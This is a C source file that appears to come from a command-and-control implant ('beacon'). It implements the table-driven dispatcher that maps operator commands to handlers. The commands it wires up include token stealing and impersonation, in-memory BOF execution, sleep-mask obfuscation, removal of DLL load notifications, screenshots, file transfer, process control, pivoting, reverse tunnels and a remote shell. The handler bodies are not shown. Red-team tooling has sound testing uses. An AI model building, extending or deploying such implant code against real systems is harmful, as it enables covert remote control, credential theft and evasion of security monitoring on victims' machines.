/* beacon/src/Commands/Dispatch.c
 * Table-driven command dispatch.
 *
 * To add a new command:
 *   1. Define NAX_CMD_YOURNAME in Wire.h
 *   2. Implement NaxCmdYourName() in Commands/YourName.c
 *   3. Add a wrapper + table entry in NaxDispatchInit(). */

#include "Nax.h"
#include "Transport.h"

/* ========= [ wrapper macros ] ========= */

/* handler( Nax, args, args_len, out, out_len ) → NAX_OK / error */
#define WRAP_STD(name) \
    static INT Wrap_##name( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) { \
        *st = ( name( Nax, task->Args, (UINT32)task->ArgsLen, out, out_len ) == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR; \
        return 1; \
    }

/* handler( Nax, out, out_len ) → NAX_OK / error */
#define WRAP_NOARG(name) \
    static INT Wrap_##name( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) { \
        (void)task; \
        *st = ( name( Nax, out, out_len ) == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR; \
        if ( *st != NAX_STATUS_OK ) *out_len = 0; \
        return 1; \
    }

/* handler( Nax, task_id, args, args_len, out, out_len ) → NAX_OK / error */
#define WRAP_TASKID(name) \
    static INT Wrap_##name( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) { \
        *st = ( name( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, out, out_len ) == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR; \
        return 1; \
    }

/* ========= [ generated wrappers ] ========= */

WRAP_NOARG(  NaxCmdWhoami )
WRAP_STD(    NaxCmdSleep )
WRAP_STD(    NaxCmdCd )
WRAP_STD(    NaxCmdPwd )
WRAP_STD(    NaxCmdMkdir )
WRAP_STD(    NaxCmdRmdir )
WRAP_STD(    NaxCmdCat )
WRAP_STD(    NaxCmdLs )
WRAP_STD(    NaxCmdCp )
WRAP_STD(    NaxCmdMv )
WRAP_STD(    NaxCmdRm )
WRAP_NOARG(  NaxCmdScreenshot )
WRAP_TASKID( NaxCmdDownload )
WRAP_STD(    NaxCmdPsList )
WRAP_STD(    NaxCmdPsKill )
WRAP_STD(    NaxCmdPsRun )
WRAP_STD(    NaxCmdUpload )
WRAP_STD(    NaxCmdSaveMemory )
WRAP_STD(    NaxCmdChunksize )
WRAP_STD(    NaxCmdWatchdogSet )
WRAP_STD(    NaxCmdBofStomp )
WRAP_STD(    NaxCmdSleepmaskSet )
WRAP_STD(    NaxCmdSleepObfConfig )
WRAP_STD(    NaxCmdUnlink )
WRAP_TASKID( NaxCmdLink )
WRAP_NOARG(  NaxCmdJobList )
WRAP_STD(    NaxCmdJobKill )
WRAP_NOARG(  NaxCmdDllNotifyList )
WRAP_NOARG(  NaxCmdDllNotifyRemove )
WRAP_STD(    NaxCmdTokenSteal )
WRAP_STD(    NaxCmdTokenUse )
WRAP_NOARG(  NaxCmdTokenGetUid )
WRAP_NOARG(  NaxCmdTokenList )
WRAP_STD(    NaxCmdTokenRm )
WRAP_NOARG(  NaxCmdTokenRevert )
WRAP_STD(    NaxCmdTokenMake )
WRAP_NOARG(  NaxCmdTokenPrivs )

/* ========= [ special-case wrappers ] ========= */

static INT Wrap_ExitThread( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
    (void)task; (void)st; (void)out; (void)out_len;
    Nax->Ntdll.RtlExitUserThread( 0 );
    return 0;
}

static INT Wrap_ExitProcess( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
    (void)task; (void)st; (void)out; (void)out_len;
    Nax->Kernel32.ExitProcess( 0 );
    return 0;
}

static INT Wrap_Bof( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
    INT rc = NaxCmdBof( Nax, task->TaskId, task->Args, (UINT32)task->ArgsLen, out, out_len );
    if ( rc == NAX_STATUS_ASYNC ) {
        *st       = NAX_STATUS_ASYNC;
        *out_len  = 0;
    } else {
        *st = ( rc == NAX_OK ) ? NAX_STATUS_OK : NAX_STATUS_ERR;
    }
    return 1;
}

static INT Wrap_PivotExec( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
    (void)st;
    NaxCmdPivotExec( Nax, task->Args, (UINT32)task->ArgsLen, out, out_len );
    return 0;
}

#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
static INT Wrap_Profile( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
    NaxCmdProfile( Nax, task->Args, (UINT32)task->ArgsLen, out, out_len );
    *st       = out[0];
    *out_len  = 0;
    return 1;
}
#endif

static INT Wrap_ShellDispatch( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
    (void)st; (void)out; (void)out_len;
    NaxShellDispatch( Nax, task->TaskId, task->CmdId, task->Args, (UINT32)task->ArgsLen );
    return 0;
}

static INT Wrap_TunnelDispatch( PNAX_INSTANCE Nax, const NAX_TASK* task, BYTE* st, PBYTE out, UINT32* out_len ) {
    (void)st; (void)out; (void)out_len;
    NaxTunnelDispatch( Nax, task->CmdId, task->Args, (UINT32)task->ArgsLen );
    return 0;
}

/* ========= [ table init ] ========= */

FUNC VOID NaxDispatchInit( PNAX_INSTANCE Nax ) {
    for ( UINT32 i = 0; i < NAX_CMD_TABLE_SIZE; i++ )
        Nax->CmdTable[i] = NULL;

    Nax->CmdTable[ NAX_CMD_WHOAMI ]        = Wrap_NaxCmdWhoami;
    Nax->CmdTable[ NAX_CMD_SLEEP ]         = Wrap_NaxCmdSleep;
    Nax->CmdTable[ NAX_CMD_EXIT_THREAD ]   = Wrap_ExitThread;
    Nax->CmdTable[ NAX_CMD_EXIT_PROCESS ]  = Wrap_ExitProcess;
    Nax->CmdTable[ NAX_CMD_CD ]            = Wrap_NaxCmdCd;
    Nax->CmdTable[ NAX_CMD_PWD ]           = Wrap_NaxCmdPwd;
    Nax->CmdTable[ NAX_CMD_MKDIR ]         = Wrap_NaxCmdMkdir;
    Nax->CmdTable[ NAX_CMD_RMDIR ]         = Wrap_NaxCmdRmdir;
    Nax->CmdTable[ NAX_CMD_CAT ]           = Wrap_NaxCmdCat;
    Nax->CmdTable[ NAX_CMD_LS ]            = Wrap_NaxCmdLs;
    Nax->CmdTable[ NAX_CMD_CP ]            = Wrap_NaxCmdCp;
    Nax->CmdTable[ NAX_CMD_MV ]            = Wrap_NaxCmdMv;
    Nax->CmdTable[ NAX_CMD_BOF ]           = Wrap_Bof;
    Nax->CmdTable[ NAX_CMD_SCREENSHOT ]    = Wrap_NaxCmdScreenshot;
    Nax->CmdTable[ NAX_CMD_DOWNLOAD ]      = Wrap_NaxCmdDownload;
    Nax->CmdTable[ NAX_CMD_PS_LIST ]       = Wrap_NaxCmdPsList;
    Nax->CmdTable[ NAX_CMD_PS_KILL ]       = Wrap_NaxCmdPsKill;
    Nax->CmdTable[ NAX_CMD_PS_RUN ]        = Wrap_NaxCmdPsRun;
    Nax->CmdTable[ NAX_CMD_UPLOAD ]        = Wrap_NaxCmdUpload;
    Nax->CmdTable[ NAX_CMD_RM ]            = Wrap_NaxCmdRm;
    Nax->CmdTable[ NAX_CMD_JOB_LIST ]      = Wrap_NaxCmdJobList;
    Nax->CmdTable[ NAX_CMD_JOB_KILL ]      = Wrap_NaxCmdJobKill;
    Nax->CmdTable[ NAX_CMD_SAVEMEMORY ]    = Wrap_NaxCmdSaveMemory;
    Nax->CmdTable[ NAX_CMD_CHUNKSIZE ]     = Wrap_NaxCmdChunksize;
    Nax->CmdTable[ NAX_CMD_WATCHDOG_SET ]  = Wrap_NaxCmdWatchdogSet;
#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
    Nax->CmdTable[ NAX_CMD_PROFILE ]       = Wrap_Profile;
#endif
    Nax->CmdTable[ NAX_CMD_BOF_STOMP ]     = Wrap_NaxCmdBofStomp;
    Nax->CmdTable[ NAX_CMD_SLEEPMASK_SET ] = Wrap_NaxCmdSleepmaskSet;
    Nax->CmdTable[ NAX_CMD_SLEEPOBF_CONFIG ] = Wrap_NaxCmdSleepObfConfig;
    Nax->CmdTable[ NAX_CMD_PIVOT_EXEC ]    = Wrap_PivotExec;
    Nax->CmdTable[ NAX_CMD_LINK ]          = Wrap_NaxCmdLink;
    Nax->CmdTable[ NAX_CMD_UNLINK ]        = Wrap_NaxCmdUnlink;
    Nax->CmdTable[ NAX_CMD_DLL_NOTIFY_LIST ]   = Wrap_NaxCmdDllNotifyList;
    Nax->CmdTable[ NAX_CMD_DLL_NOTIFY_REMOVE ] = Wrap_NaxCmdDllNotifyRemove;
    Nax->CmdTable[ NAX_CMD_TUNNEL_CONNECT_TCP ] = Wrap_TunnelDispatch;
    Nax->CmdTable[ NAX_CMD_TUNNEL_WRITE_TCP ]   = Wrap_TunnelDispatch;
    Nax->CmdTable[ NAX_CMD_TUNNEL_CLOSE ]       = Wrap_TunnelDispatch;
    Nax->CmdTable[ NAX_CMD_TUNNEL_REVERSE ]     = Wrap_TunnelDispatch;
    Nax->CmdTable[ NAX_CMD_TUNNEL_PAUSE ]       = Wrap_TunnelDispatch;
    Nax->CmdTable[ NAX_CMD_TUNNEL_RESUME ]      = Wrap_TunnelDispatch;
    Nax->CmdTable[ NAX_CMD_SHELL_START ]  = Wrap_ShellDispatch;
    Nax->CmdTable[ NAX_CMD_SHELL_WRITE ]  = Wrap_ShellDispatch;
    Nax->CmdTable[ NAX_CMD_SHELL_CLOSE ]  = Wrap_ShellDispatch;
    Nax->CmdTable[ NAX_CMD_TOKEN_GETUID ]  = Wrap_NaxCmdTokenGetUid;
    Nax->CmdTable[ NAX_CMD_TOKEN_STEAL ]   = Wrap_NaxCmdTokenSteal;
    Nax->CmdTable[ NAX_CMD_TOKEN_USE ]     = Wrap_NaxCmdTokenUse;
    Nax->CmdTable[ NAX_CMD_TOKEN_LIST ]    = Wrap_NaxCmdTokenList;
    Nax->CmdTable[ NAX_CMD_TOKEN_RM ]      = Wrap_NaxCmdTokenRm;
    Nax->CmdTable[ NAX_CMD_TOKEN_REVERT ]  = Wrap_NaxCmdTokenRevert;
    Nax->CmdTable[ NAX_CMD_TOKEN_MAKE ]    = Wrap_NaxCmdTokenMake;
    Nax->CmdTable[ NAX_CMD_TOKEN_PRIVS ]   = Wrap_NaxCmdTokenPrivs;
}

/* ========= [ dispatcher ] ========= */

FUNC INT NaxDispatch( PNAX_INSTANCE    Nax,
                      const NAX_TASK*  task,
                      UINT32*          result_task_id,
                      BYTE*            result_status,
                      PBYTE            result_data,
                      UINT32*          result_data_len ) {

    *result_task_id = task->TaskId;

    if ( task->CmdId >= NAX_CMD_TABLE_SIZE || !Nax->CmdTable[ task->CmdId ] ) {
        *result_status   = NAX_STATUS_ERR;
        *result_data_len = 0;
        return 1;
    }

    return Nax->CmdTable[ task->CmdId ]( Nax, task, result_status, result_data, result_data_len );
}
